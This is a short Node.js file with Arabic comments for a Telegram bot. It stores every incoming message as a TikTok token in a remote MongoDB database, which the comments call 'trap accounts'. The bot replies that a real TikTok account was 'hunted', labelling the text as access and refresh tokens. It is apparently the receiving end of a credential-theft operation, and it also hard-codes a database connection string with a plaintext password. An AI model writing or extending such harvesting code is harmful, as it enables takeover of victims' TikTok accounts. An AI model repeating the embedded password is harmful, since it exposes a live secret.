const { Bot, webhookCallback } = require("grammy");
const mongoose = require("mongoose");

// رابط الاتصال بقاعدة البيانات السحابية مع كلمة المرور الخاصة بك
const mongoURI = "mongodb+srv://elmad7332015202_db_user:MArnQYVmP1NY6gFn@cluster0.uxbvi.mongodb.net/tiktok_database?retryWrites=true&w=majority";

// الاتصال بقاعدة البيانات
mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("Connected to MongoDB successfully!"))
  .catch(err => console.error("MongoDB connection error:", err));

// تعريف هيكل حفظ الحسابات المصيدة
const AccountSchema = new mongoose.Schema({
  tokenData: String,
  createdAt: { type: Date, default: Date.now }
});
const Account = mongoose.model("Account", AccountSchema);

const bot = new Bot(process.env.TELEGRAM_TOKEN);

bot.on("message", async (ctx) => {
    const text = ctx.message.text || "التوكن المستلم";

    // 1. حفظ التوكن تلقائياً في قاعدة البيانات السحابية في الخلفية
    try {
        await Account.create({ tokenData: text });
    } catch (err) {
        console.error("Error saving to database:", err);
    }

    // 2. إرسال الرسالة البنفسجية المعتادة لك في تليجرام دون أي تغيير
    const oldMessage = `👑 تم صيد حساب تيك توك حقيقي بنجاح 👑

🔑 ACCESS TOKEN:
${text}

🔄 REFRESH TOKEN:
${text}`;

    await ctx.reply(oldMessage);
});

module.exports = webhookCallback(bot, "http");
